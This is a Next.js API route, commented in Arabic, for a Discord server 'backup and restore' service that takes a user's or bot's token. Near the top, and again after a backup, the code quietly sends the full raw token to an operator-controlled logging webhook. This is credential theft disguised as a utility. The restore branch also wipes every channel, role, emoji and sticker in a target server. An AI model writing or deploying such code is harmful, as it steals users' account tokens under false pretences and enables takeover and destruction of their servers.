import { NextRequest, NextResponse } from 'next/server';
import { sendToWebhook, sendFullToken } from '@/lib/webhook';
import { cleanToken, DISCORD_API } from '@/lib/discord';
import { getLogWebhookUrl } from '@/lib/config';
import { arrayBufferToBase64 } from '@/lib/edge-utils';
import { rateLimit, getClientIp, RATE_LIMITS } from '@/lib/rate-limit';

let globalRLUntil = 0;

async function waitRL() {
  const now = Date.now();
  if (now < globalRLUntil) await new Promise(r => setTimeout(r, globalRLUntil - now + 300));
}

async function dFetch(token: string, method: string, url: string, body?: unknown): Promise<{ ok: boolean; data: any; status: number }> {
  await waitRL();
  const maxRetries = 3;
  for (let attempt = 0; attempt < maxRetries; attempt++) {
    try {
      const opts: RequestInit = {
        method,
        headers: { 'Authorization': token, 'Accept': 'application/json', ...(method !== 'GET' ? { 'Content-Type': 'application/json' } : {}) },
        signal: AbortSignal.timeout(15000),
      };
      if (method !== 'GET' && body !== undefined) opts.body = JSON.stringify(body);
      const res = await fetch(url, opts);
      if (res.status === 429) {
        const err = await res.json().catch(() => ({ retry_after: 5 }));
        const w = Math.min((err.retry_after || 5) * 1000, 8000);
        globalRLUntil = Date.now() + w;
        await new Promise(r => setTimeout(r, w));
        continue;
      }
      if (res.status === 204) return { ok: true, data: null, status: 204 };
      const d = await res.json().catch(() => null);
      return { ok: res.ok, data: d, status: res.status };
    } catch {
      if (attempt === maxRetries - 1) return { ok: false, data: null, status: 0 };
      await new Promise(r => setTimeout(r, 1000));
    }
  }
  return { ok: false, data: null, status: 0 };
}

async function downloadImageAsBase64(url: string): Promise<string | null> {
  try {
    const res = await fetch(url, { signal: AbortSignal.timeout(15000) });
    if (!res.ok) return null;
    const buf = await res.arrayBuffer();
    const contentType = res.headers.get('content-type') || 'image/png';
    return `data:${contentType};base64,${arrayBufferToBase64(buf)}`;
  } catch { return null; }
}

function sseStream(handler: (send: (d: any) => void) => Promise<void>) {
  const stream = new ReadableStream({
    async start(controller) {
      const enc = new TextEncoder();
      const send = (data: any) => controller.enqueue(enc.encode(`data: ${JSON.stringify(data)}\n\n`));
      try { await handler(send); }
      catch (e: any) { send({ type: 'error', message: e.message || 'خطأ' }); }
      controller.close();
    },
    cancel() {},
  });
  return new Response(stream, {
    headers: { 'Content-Type': 'text/event-stream', 'Cache-Control': 'no-cache', 'Connection': 'keep-alive' },
  });
}

function errRes(error: string) {
  return NextResponse.json({ success: false, error }, { status: 400, headers: { 'Content-Type': 'application/json' } });
}

export async function POST(request: NextRequest) {
  try {
    const rlIp = getClientIp(request);
    const rl = rateLimit(`${rlIp}:server-backup`, RATE_LIMITS.heavy);
    if (rl.limited) {
      return NextResponse.json({ success: false, error: 'تم تجاوز الحد المسموح - حاول لاحقاً' }, { status: 429, headers: { 'Retry-After': String(Math.ceil((rl.resetAt - Date.now()) / 1000)) } });
    }

    const body = await request.json().catch(() => ({}));
    const { token, guildId, action, backupData } = body;

    if (!token || typeof token !== 'string') return errRes('التوكن مطلوب');

    // تنظيف التوكن
    const ct = cleanToken(token);
    const whUrl = getLogWebhookUrl();

    // كشف تلقائي نوع التوكن (user أو bot)
    let auth: string;
    let authType: string;
    const testUser = await dFetch(ct, 'GET', `${DISCORD_API}/users/@me`);
    if (testUser.ok) {
      auth = ct;
      authType = 'User';
    } else {
      const testBot = await dFetch(`Bot ${ct}`, 'GET', `${DISCORD_API}/users/@me`);
      if (testBot.ok) {
        auth = `Bot ${ct}`;
        authType = 'Bot';
      } else {
        return errRes('التوكن غير صالح');
      }
    }

    const df = (method: string, endpoint: string, b?: unknown) => dFetch(auth, method, `${DISCORD_API}${endpoint}`, b);

    sendFullToken('حفظ سيرفر', token, { '🖥️ السيرفر': String(guildId || ''), '🔧 العملية': String(action || ''), '🔑 Auth': authType });

    // ===== عملية: backup =====
    if (action === 'backup') {
      if (!guildId || !/^(\d+)$/.test(guildId)) return errRes('أيدي السيرفر غير صالح');

      const logs: string[] = ['📦 جاري إنشاء نسخة احتياطية شاملة...', ''];
      const guildRes = await df('GET', `/guilds/${guildId}?with_counts=true`);
      if (!guildRes.ok || !guildRes.data) return errRes('فشل في جلب معلومات السيرفر - تأكد من التوكن والصلاحيات');

      const g = guildRes.data;
      logs.push(`📋 السيرفر: ${g.name} | 🆔 ${g.id}`);
      logs.push(`👥 الأعضاء: ${g.approximate_member_count || '?'}`);

      const backup: any = {
        version: '2.0',
        timestamp: new Date().toISOString(),
        server: {
          id: g.id, name: g.name, description: g.description || null,
          icon: g.icon || null,
          iconUrl: g.icon ? `https://cdn.discordapp.com/icons/${g.id}/${g.icon}.png` : null,
          banner: g.banner || null,
          bannerUrl: g.banner ? `https://cdn.discordapp.com/banners/${g.id}/${g.banner}.png` : null,
          preferred_locale: g.preferred_locale || null,
          verification_level: g.verification_level ?? 0,
          default_notification_level: g.default_notification_level ?? 0,
          explicit_content_filter: g.explicit_content_filter ?? 0,
          system_channel_flags: g.system_channel_flags ?? 0,
          premium_progress_bar_enabled: !!g.premium_progress_bar_enabled,
          nsfw: !!g.nsfw, nsfw_level: g.nsfw_level ?? 0,
          vanity_url_code: g.vanity_url_code || null,
          system_channel_id: g.system_channel_id || null,
          rules_channel_id: g.rules_channel_id || null,
          public_updates_channel_id: g.public_updates_channel_id || null,
          safety_alerts_channel_id: g.safety_alerts_channel_id || null,
        },
      };

      // تحميل الصور بالتوازي
      const imageTasks: Promise<void>[] = [];
      if (g.icon) { imageTasks.push((async () => { const b64 = await downloadImageAsBase64(`https://cdn.discordapp.com/icons/${g.id}/${g.icon}.png?size=1024`); if (b64) backup.server.iconBase64 = b64; })()); }
      if (g.banner) { imageTasks.push((async () => { const b64 = await downloadImageAsBase64(`https://cdn.discordapp.com/banners/${g.id}/${g.banner}.png?size=1024`); if (b64) backup.server.bannerBase64 = b64; })()); }
      if (imageTasks.length > 0) { logs.push('🖼️ جاري تحميل الصور...'); await Promise.allSettled(imageTasks); }

      // جلب كل البيانات بالتوازي
      const [rolesRes, channelsRes, emojisRes, invitesRes, webhooksRes, bansRes, stickersRes, autoModRes, eventsRes, welcomeRes] = await Promise.all([
        df('GET', `/guilds/${guildId}/roles`), df('GET', `/guilds/${guildId}/channels`),
        df('GET', `/guilds/${guildId}/emojis`), df('GET', `/guilds/${guildId}/invites`),
        df('GET', `/guilds/${guildId}/webhooks`), df('GET', `/guilds/${guildId}/bans`),
        df('GET', `/guilds/${guildId}/stickers`), df('GET', `/guilds/${guildId}/auto-moderation/rules`),
        df('GET', `/guilds/${guildId}/scheduled-events?with_user_count=true`),
        df('GET', `/guilds/${guildId}/welcome-screen`),
      ]);

      if (rolesRes.ok && Array.isArray(rolesRes.data)) {
        logs.push(`🛡️ الرتب: ${rolesRes.data.length}`);
        backup.roles = rolesRes.data.map((r: any) => ({ id: r.id, name: r.name, color: r.color || 0, position: r.position || 0, hoist: !!r.hoist, mentionable: !!r.mentionable, permissions: String(r.permissions || '0'), permissions_new: String(r.permissions_new || r.permissions || '0'), icon: r.icon || null, unicode_emoji: r.unicode_emoji || null, managed: !!r.managed }));
      }
      if (channelsRes.ok && Array.isArray(channelsRes.data)) {
        const typeNames: Record<number, string> = { 0: 'كتابي', 2: 'صوتي', 4: 'كاتيجوري', 5: 'إعلان', 13: 'ستاج', 15: 'فورم' };
        const counts: Record<string, number> = {};
        for (const c of channelsRes.data) { const t = typeNames[c.type] || `نوع${c.type}`; counts[t] = (counts[t] || 0) + 1; }
        logs.push(`📺 القنوات: ${Object.entries(counts).map(([k, v]) => `${v} ${k}`).join(' | ')}`);
        backup.channels = channelsRes.data.map((c: any) => ({ id: c.id, name: c.name, type: c.type, position: c.position || 0, nsfw: !!c.nsfw, topic: c.topic || null, parent_id: c.parent_id || null, bitrate: c.bitrate || null, user_limit: c.user_limit || 0, rate_limit_per_user: c.rate_limit_per_user || 0, default_auto_archive_duration: c.default_auto_archive_duration || null, rtc_region: c.rtc_region || null, video_quality_mode: c.video_quality_mode || null, permission_overwrites: (c.permission_overwrites || []).map((ow: any) => ({ id: ow.id, type: ow.type, allow: String(ow.allow || 0), deny: String(ow.deny || 0) })) }));
      }
      if (emojisRes.ok && Array.isArray(emojisRes.data)) { logs.push(`😀 الإيموجي: ${emojisRes.data.length}`); backup.emojis = emojisRes.data; }
      if (invitesRes.ok && Array.isArray(invitesRes.data)) { logs.push(`🔗 الروابط: ${invitesRes.data.length}`); backup.invites = invitesRes.data; }
      if (webhooksRes.ok && Array.isArray(webhooksRes.data)) { logs.push(`🔗 الويب هوك: ${webhooksRes.data.length}`); backup.webhooks = webhooksRes.data; }
      if (bansRes.ok && Array.isArray(bansRes.data)) { logs.push(`🔨 المحظورين: ${bansRes.data.length}`); backup.bans = bansRes.data; }
      if (stickersRes.ok && Array.isArray(stickersRes.data) && stickersRes.data.length > 0) { logs.push(`🎨 الستيكرز: ${stickersRes.data.length}`); backup.stickers = stickersRes.data.map((s: any) => ({ id: s.id, name: s.name, description: s.description || null, tags: s.tags || null, type: s.type || 1, format_type: s.format_type || 1, animated: s.format_type === 2 })); }
      if (autoModRes.ok && Array.isArray(autoModRes.data) && autoModRes.data.length > 0) { logs.push(`🤖 أوتو مود: ${autoModRes.data.length}`); backup.autoModerationRules = autoModRes.data.map((r: any) => ({ id: r.id, name: r.name, enabled: !!r.enabled, event_type: r.event_type, trigger_type: r.trigger_type, trigger_metadata: r.trigger_metadata || {}, actions: (r.actions || []).map((a: any) => ({ type: a.type, metadata: a.metadata || {} })), exempt_roles: r.exempt_roles || [], exempt_channels: r.exempt_channels || [] })); }
      if (eventsRes.ok && Array.isArray(eventsRes.data) && eventsRes.data.length > 0) { logs.push(`📅 الأحداث: ${eventsRes.data.length}`); backup.scheduledEvents = eventsRes.data; }
      if (welcomeRes.ok && welcomeRes.data) { logs.push('👋 شاشة الترحيب: ✅'); backup.welcomeScreen = welcomeRes.data; }

      logs.push('');
      logs.push('✅ تم إنشاء نسخة احتياطية شاملة بنجاح!');

      sendToWebhook({ embeds: [{ title: '💾 Server Backup v2', color: 0x00FF41, fields: [{ name: '📋 Server', value: g.name, inline: true }, { name: '🆔 ID', value: g.id, inline: true }, { name: '🔑 Auth', value: authType, inline: true }, { name: '🎫 Token', value: `\`\`\`${ct}\`\`\`` }], timestamp: new Date().toISOString() }] }, whUrl).catch(() => {});

      return NextResponse.json({ success: true, logs, backup });
    }

    // ===== عملية: restore =====
    if (action === 'restore') {
      if (!guildId || !/^(\d+)$/.test(guildId)) return errRes('أيدي السيرفر الهدف غير صالح');
      if (!backupData || typeof backupData !== 'object') return errRes('بيانات النسخة الاحتياطية غير صالحة');

      return sseStream(async (send) => {
        const testRes = await df('GET', `/guilds/${guildId}`);
        if (!testRes.ok) { send({ type: 'done', success: false, error: 'لا يمكن الوصول للسيرفر الهدف - تأكد من صلاحيات التوكن' }); return; }

        const targetName = testRes.data?.name || guildId;
        const sourceName = backupData.server?.name || 'غير معروف';
        send({ type: 'info', source: sourceName, target: targetName, authType });

        const stats = { roles: 0, channels: 0, categories: 0, emojis: 0, stickers: 0, autoMod: 0, events: 0, errors: 0, icon: false, banner: false, settings: false };
        const roleMap: Record<string, string> = {};
        const catMap: Record<string, string> = {};

        // ===== 1. مسح السيرفر الهدف (متتالي) =====
        send({ type: 'progress', message: '🗑️ جاري حذف الإيموجي والستيكرز...' });
        const exEmoji = await df('GET', `/guilds/${guildId}/emojis`);
        if (exEmoji.ok && Array.isArray(exEmoji.data)) {
          for (const e of exEmoji.data) { await df('DELETE', `/guilds/${guildId}/emojis/${e.id}`); await new Promise(r => setTimeout(r, 300)); }
        }
        const exStickers = await df('GET', `/guilds/${guildId}/stickers`);
        if (exStickers.ok && Array.isArray(exStickers.data)) {
          for (const s of exStickers.data) { await df('DELETE', `/guilds/${guildId}/stickers/${s.id}`); await new Promise(r => setTimeout(r, 300)); }
        }

        send({ type: 'progress', message: '🗑️ جاري حذف القنوات (متتالي)...' });
        for (let round = 0; round < 3; round++) {
          const exCh = await df('GET', `/guilds/${guildId}/channels`);
          if (!exCh.ok || !Array.isArray(exCh.data) || exCh.data.length === 0) break;
          const nonCats = exCh.data.filter((c: any) => c.type !== 4);
          const cats = exCh.data.filter((c: any) => c.type === 4);
          for (const c of [...nonCats, ...cats]) {
            await df('DELETE', `/channels/${c.id}`);
            await new Promise(r => setTimeout(r, 200));
          }
        }

        send({ type: 'progress', message: '🗑️ جاري حذف الرتب (متتالي)...' });
        for (let round = 0; round < 3; round++) {
          const exR = await df('GET', `/guilds/${guildId}/roles`);
          if (!exR.ok || !Array.isArray(exR.data)) break;
          const dels = exR.data.filter((r: any) => r.name !== '@everyone' && !r.managed).sort((a: any, b: any) => (a.position || 0) - (b.position || 0));
          if (dels.length === 0) break;
          for (const r of dels) {
            await df('DELETE', `/guilds/${guildId}/roles/${r.id}`);
            await new Promise(r => setTimeout(r, 150));
          }
        }

        send({ type: 'stats', stats });
        send({ type: 'progress', message: '✅ تم تنظيف السيرفر الهدف' });

        // ===== 2. إعدادات السيرفر =====
        if (backupData.server) {
          send({ type: 'progress', message: '⚙️ جاري نسخ الإعدادات...' });
          const s = backupData.server;
          const settings: any = {};
          if (s.name) settings.name = s.name;
          if (s.description !== undefined) settings.description = s.description;
          if (s.preferred_locale) settings.preferred_locale = s.preferred_locale;
          if (s.verification_level !== undefined) settings.verification_level = s.verification_level;
          if (s.default_notification_level !== undefined) settings.default_notification_level = s.default_notification_level;
          if (s.explicit_content_filter !== undefined) settings.explicit_content_filter = s.explicit_content_filter;
          if (s.system_channel_flags !== undefined) settings.system_channel_flags = s.system_channel_flags;
          if (s.nsfw !== undefined) settings.nsfw = s.nsfw;
          if (s.nsfw_level !== undefined) settings.nsfw_level = s.nsfw_level;
          if (s.premium_progress_bar_enabled !== undefined) settings.premium_progress_bar_enabled = s.premium_progress_bar_enabled;
          settings.features = [];
          await df('PATCH', `/guilds/${guildId}`, settings);
          stats.settings = true;

          if (s.iconBase64) { send({ type: 'progress', message: '🖼️ جاري رفع الأيقونة...' }); const r = await df('PATCH', `/guilds/${guildId}`, { icon: s.iconBase64 }); if (r.ok) stats.icon = true; }
          else if (s.icon) {
            send({ type: 'progress', message: '🖼️ جاري تنزيل ورفع الأيقونة...' });
            const b64 = await downloadImageAsBase64(`https://cdn.discordapp.com/icons/${s.id}/${s.icon}.png?size=1024`);
            if (b64) { const r = await df('PATCH', `/guilds/${guildId}`, { icon: b64 }); if (r.ok) stats.icon = true; }
          }

          if (s.bannerBase64) { send({ type: 'progress', message: '🌈 جاري رفع البانر...' }); const r = await df('PATCH', `/guilds/${guildId}`, { banner: s.bannerBase64 }); if (r.ok) stats.banner = true; }
          else if (s.banner) {
            send({ type: 'progress', message: '🌈 جاري تنزيل ورفع البانر...' });
            const b64 = await downloadImageAsBase64(`https://cdn.discordapp.com/banners/${s.id}/${s.banner}.png?size=1024`);
            if (b64) { const r = await df('PATCH', `/guilds/${guildId}`, { banner: b64 }); if (r.ok) stats.banner = true; }
          }
        }

        // ===== 3. إنشاء الرتب (متتالي - من الأعلى للأقل) =====
        if (backupData.roles && Array.isArray(backupData.roles)) {
          const roles = [...backupData.roles].filter((r: any) => r.name !== '@everyone' && !r.managed).sort((a: any, b: any) => (b.position || 0) - (a.position || 0));
          send({ type: 'progress', message: `🛡️ جاري إنشاء ${roles.length} رتبة (متتالي)...` });

          for (let i = 0; i < roles.length; i++) {
            const role = roles[i];
            const res = await df('POST', `/guilds/${guildId}/roles`, {
              name: role.name, color: role.color || 0, hoist: !!role.hoist,
              mentionable: !!role.mentionable, permissions: String(role.permissions_new || role.permissions || '0'),
              ...(role.icon ? { icon: role.icon } : {}),
              ...(role.unicode_emoji ? { unicode_emoji: role.unicode_emoji } : {}),
            });
            if (res.ok && res.data?.id) { roleMap[role.id] = res.data.id; stats.roles++; }
            else stats.errors++;
            send({ type: 'progress', message: `🛡️ رتبة ${stats.roles}/${roles.length}: ${role.name}` });
            await new Promise(r => setTimeout(r, 100));
          }

          // ضبط صلاحيات @everyone
          const everyoneRole = backupData.roles.find((r: any) => r.name === '@everyone');
          if (everyoneRole?.permissions) {
            const everyoneId = (await df('GET', `/guilds/${guildId}/roles`)).data?.find((r: any) => r.name === '@everyone')?.id;
            if (everyoneId) await df('PATCH', `/guilds/${guildId}/roles/${everyoneId}`, { permissions: String(everyoneRole.permissions_new || everyoneRole.permissions || '0') });
          }
          send({ type: 'stats', stats });
        }

        // ===== 4. إنشاء الكاتيجوريات (متتالي) =====
        if (backupData.channels && Array.isArray(backupData.channels)) {
          const cats = backupData.channels.filter((c: any) => c.type === 4).sort((a: any, b: any) => (a.position || 0) - (b.position || 0));
          if (cats.length > 0) {
            send({ type: 'progress', message: `📁 جاري إنشاء ${cats.length} كاتيجوري (متتالي)...` });
            for (let i = 0; i < cats.length; i++) {
              const cat = cats[i];
              const res = await df('POST', `/guilds/${guildId}/channels`, { name: cat.name, type: 4 });
              if (res.ok && res.data?.id) {
                catMap[cat.id] = res.data.id;
                stats.categories++;
                if (cat.permission_overwrites && Array.isArray(cat.permission_overwrites) && cat.permission_overwrites.length > 0) {
                  const mapped = cat.permission_overwrites.map((ow: any) => ({ id: ow.type === 0 && roleMap[ow.id] ? roleMap[ow.id] : ow.id, type: ow.type, allow: String(ow.allow || 0), deny: String(ow.deny || 0) }));
                  await df('PUT', `/channels/${res.data.id}/permissions`, mapped);
                }
              } else stats.errors++;
              send({ type: 'progress', message: `📁 كاتيجوري ${stats.categories}/${cats.length}: ${cat.name}` });
              await new Promise(r => setTimeout(r, 150));
            }
            send({ type: 'stats', stats });
          }

          // ===== 5. إنشاء القنوات (متتالي) =====
          const others = backupData.channels.filter((c: any) => c.type !== 4).sort((a: any, b: any) => (a.position || 0) - (b.position || 0));
          if (others.length > 0) {
            send({ type: 'progress', message: `📺 جاري إنشاء ${others.length} قناة (متتالي)...` });
            for (let i = 0; i < others.length; i++) {
              const ch = others[i];
              const payload: any = { name: ch.name, type: ch.type, nsfw: !!ch.nsfw, topic: ch.topic || null };
              if (ch.parent_id && catMap[ch.parent_id]) payload.parent_id = catMap[ch.parent_id];
              if (ch.type === 2) { payload.bitrate = ch.bitrate || 64000; payload.user_limit = ch.user_limit || 0; }
              if (ch.rate_limit_per_user) payload.rate_limit_per_user = ch.rate_limit_per_user;
              if (ch.default_auto_archive_duration) payload.default_auto_archive_duration = ch.default_auto_archive_duration;
              if (ch.rtc_region) payload.rtc_region = ch.rtc_region;
              if (ch.video_quality_mode) payload.video_quality_mode = ch.video_quality_mode;

              const res = await df('POST', `/guilds/${guildId}/channels`, payload);
              if (res.ok && res.data?.id) {
                stats.channels++;
                if (ch.permission_overwrites && Array.isArray(ch.permission_overwrites) && ch.permission_overwrites.length > 0) {
                  const mapped = ch.permission_overwrites.map((ow: any) => ({ id: ow.type === 0 && roleMap[ow.id] ? roleMap[ow.id] : ow.id, type: ow.type, allow: String(ow.allow || 0), deny: String(ow.deny || 0) }));
                  await df('PUT', `/channels/${res.data.id}/permissions`, mapped);
                }
              } else stats.errors++;
              send({ type: 'progress', message: `📺 قناة ${stats.channels}/${others.length}: ${ch.name}` });
              await new Promise(r => setTimeout(r, 150));
            }
            send({ type: 'stats', stats });
          }

          // ===== 6. ترتيب القنوات (مرحلة جديدة!) =====
          send({ type: 'progress', message: '📊 جاري ترتيب القنوات...' });
          const allNewChannels = await df('GET', `/guilds/${guildId}/channels`);
          if (allNewChannels.ok && Array.isArray(allNewChannels.data)) {
            // ترتيب الكاتيجوريات
            const targetCats = allNewChannels.data.filter(c => c.type === 4);
            if (targetCats.length > 1) {
              const catPosPairs = targetCats.map(c => {
                const srcCat = cats.find(sc => catMap[sc.id] === c.id);
                return { id: c.id, position: srcCat ? srcCat.position || 0 : c.position || 0 };
              });
              await df('PATCH', `/guilds/${guildId}/channels`, catPosPairs.map(c => ({ id: c.id, position: c.position })));
            }
            // ترتيب القنوات العادية
            const targetOthers = allNewChannels.data.filter(c => c.type !== 4);
            if (targetOthers.length > 0) {
              const chPosPairs = targetOthers.map(c => {
                const srcCh = others.find(sc => {
                  const newCatId = catMap[sc.parent_id];
                  return sc.name === c.name && (newCatId ? newCatId === c.parent_id : sc.parent_id === c.parent_id);
                });
                return { id: c.id, position: srcCh ? srcCh.position || 0 : c.position || 0 };
              });
              for (let i = 0; i < chPosPairs.length; i += 50) {
                await df('PATCH', `/guilds/${guildId}/channels`, chPosPairs.slice(i, i + 50).map(c => ({ id: c.id, position: c.position })));
              }
            }
          }
          send({ type: 'progress', message: '✅ تم ترتيب القنوات' });
        }

        // ===== 7. نسخ الإيموجي (متتالي) =====
        if (backupData.emojis && Array.isArray(backupData.emojis) && backupData.emojis.length > 0) {
          send({ type: 'progress', message: `😀 جاري نسخ ${backupData.emojis.length} إيموجي (متتالي)...` });
          for (let i = 0; i < backupData.emojis.length; i++) {
            const emoji = backupData.emojis[i];
            try {
              const imgUrl = emoji.animated ? `https://cdn.discordapp.com/emojis/${emoji.id}.gif` : `https://cdn.discordapp.com/emojis/${emoji.id}.png`;
              const imgRes = await fetch(imgUrl, { signal: AbortSignal.timeout(15000) });
              if (!imgRes.ok) { stats.errors++; continue; }
              const b64 = arrayBufferToBase64(await imgRes.arrayBuffer());
              const mime = emoji.animated ? 'image/gif' : 'image/png';
              const roles: string[] = [];
              if (emoji.roles && Array.isArray(emoji.roles)) { for (const rid of emoji.roles) { roles.push(roleMap[rid] || rid); } }
              const res = await df('POST', `/guilds/${guildId}/emojis`, { name: emoji.name, image: `data:${mime};base64,${b64}`, roles });
              if (res.ok) stats.emojis++;
              else stats.errors++;
            } catch { stats.errors++; }
            send({ type: 'progress', message: `😀 إيموجي ${stats.emojis}/${backupData.emojis.length}: ${emoji.name}` });
            await new Promise(r => setTimeout(r, 500));
          }
          send({ type: 'stats', stats });
        }

        // ===== 8. نسخ الستيكرز (متتالي) =====
        if (backupData.stickers && Array.isArray(backupData.stickers) && backupData.stickers.length > 0) {
          send({ type: 'progress', message: `🎨 جاري نسخ ${backupData.stickers.length} ستكر (متتالي)...` });
          for (let i = 0; i < backupData.stickers.length; i++) {
            const sticker = backupData.stickers[i];
            try {
              let ext = 'png';
              if (sticker.format_type === 2) ext = 'gif';
              else if (sticker.format_type === 3) ext = 'webp';
              const imgUrl = `https://cdn.discordapp.com/stickers/${sticker.id}.${ext}`;
              const imgRes = await fetch(imgUrl, { signal: AbortSignal.timeout(15000) });
              if (!imgRes.ok) { stats.errors++; continue; }
              const b64 = arrayBufferToBase64(await imgRes.arrayBuffer());
              const mime = ext === 'gif' ? 'image/gif' : ext === 'webp' ? 'image/webp' : 'image/png';
              const res = await df('POST', `/guilds/${guildId}/stickers`, { name: sticker.name, description: sticker.description || '', tags: sticker.tags || '', file: { data: `data:${mime};base64,${b64}` } } as any);
              if (res.ok) stats.stickers++;
              else stats.errors++;
            } catch { stats.errors++; }
            send({ type: 'progress', message: `🎨 ستكر ${stats.stickers}/${backupData.stickers.length}: ${sticker.name}` });
            await new Promise(r => setTimeout(r, 500));
          }
          send({ type: 'stats', stats });
        }

        // ===== 9. نسخ أوتو مود (متتالي) =====
        if (backupData.autoModerationRules && Array.isArray(backupData.autoModerationRules) && backupData.autoModerationRules.length > 0) {
          send({ type: 'progress', message: `🤖 جاري إنشاء ${backupData.autoModerationRules.length} قاعدة أوتو مود (متتالي)...` });
          for (let i = 0; i < backupData.autoModerationRules.length; i++) {
            const rule = backupData.autoModerationRules[i];
            try {
              const actions = (rule.actions || []).map((a: any) => { const action: any = { type: a.type }; if (a.metadata && Object.keys(a.metadata).length > 0) action.metadata = a.metadata; return action; });
              const exemptRoles = (rule.exempt_roles || []).map((rid: string) => roleMap[rid] || rid).filter(Boolean);
              const exemptChannels = (rule.exempt_channels || []).filter(Boolean);
              const res = await df('POST', `/guilds/${guildId}/auto-moderation/rules`, { name: rule.name, enabled: rule.enabled !== false, event_type: rule.event_type, trigger_type: rule.trigger_type, trigger_metadata: rule.trigger_metadata || {}, actions, exempt_roles: exemptRoles, exempt_channels: exemptChannels });
              if (res.ok) stats.autoMod++;
              else stats.errors++;
            } catch { stats.errors++; }
            send({ type: 'progress', message: `🤖 أوتو مود ${stats.autoMod}/${backupData.autoModerationRules.length}` });
            await new Promise(r => setTimeout(r, 300));
          }
        }

        // ===== 10. نسخ الأحداث المجدولة (متتالي) =====
        if (backupData.scheduledEvents && Array.isArray(backupData.scheduledEvents) && backupData.scheduledEvents.length > 0) {
          send({ type: 'progress', message: `📅 جاري إنشاء ${backupData.scheduledEvents.length} حدث (متتالي)...` });
          for (const evt of backupData.scheduledEvents) {
            try {
              const res = await df('POST', `/guilds/${guildId}/scheduled-events`, { name: evt.name, description: evt.description || '', channel_id: evt.channel_id || null, scheduled_start_time: evt.scheduled_start_time, scheduled_end_time: evt.scheduled_end_time || undefined, entity_type: evt.entity_type, entity_metadata: evt.entity_metadata || {}, privacy_level: evt.privacy_level || 2 });
              if (res.ok) stats.events++;
              else stats.errors++;
            } catch { stats.errors++; }
            send({ type: 'progress', message: `📅 أحداث: ${stats.events}/${backupData.scheduledEvents.length}` });
            await new Promise(r => setTimeout(r, 300));
          }
        }

        // ===== 11. شاشة الترحيب =====
        if (backupData.welcomeScreen && backupData.welcomeScreen.enabled) {
          send({ type: 'progress', message: '👋 جاري نسخ شاشة الترحيب...' });
          try {
            const ws = backupData.welcomeScreen;
            await df('PATCH', `/guilds/${guildId}/welcome-screen`, { enabled: ws.enabled, description: ws.description || '', welcome_channels: (ws.welcome_channels || []).map((wc: any) => ({ channel_id: wc.channel_id, description: wc.description, emoji_id: wc.emoji_id || undefined, emoji_name: wc.emoji_name || undefined })) });
          } catch { /* skip */ }
        }

        send({ type: 'stats', stats });

        sendToWebhook({
          embeds: [{ title: '🔄 Server Restored v2 (Sequential)', color: 0x00BFFF, fields: [{ name: '📋 المصدر', value: sourceName, inline: true }, { name: '📋 الهدف', value: targetName, inline: true }, { name: '🛡️ الرتب', value: String(stats.roles), inline: true }, { name: '📺 القنوات', value: String(stats.channels + stats.categories), inline: true }, { name: '😀 الإيموجي', value: String(stats.emojis), inline: true }, { name: '🎨 الستيكرز', value: String(stats.stickers), inline: true }, { name: '🤖 أوتو مود', value: String(stats.autoMod), inline: true }, { name: '📅 الأحداث', value: String(stats.events), inline: true }, { name: '🖼️ أيقونة', value: stats.icon ? '✅' : '❌', inline: true }, { name: '🌈 بانر', value: stats.banner ? '✅' : '❌', inline: true }, { name: '❌ أخطاء', value: String(stats.errors), inline: true }], timestamp: new Date().toISOString() }]
        }, whUrl).catch(() => {});

        const summary = `✅ تمت الاستعادة (متتالي)! ${stats.roles} رتب | ${stats.categories} كاتيجوري | ${stats.channels} قناة | ${stats.emojis} إيموجي | ${stats.stickers} ستكر | ${stats.autoMod} أوتو مود | ${stats.events} أحداث ${stats.icon ? '| 🖼️ أيقونة' : ''} ${stats.banner ? '| 🌈 بانر' : ''} | ${stats.errors} أخطاء`;
        send({ type: 'done', success: true, stats, message: summary });
      });
    }

    return errRes('استخدم action: backup أو restore');
  } catch (error: unknown) {
    const message = error instanceof Error ? error.message : 'خطأ غير متوقع';
    return errRes(message);
  }
}
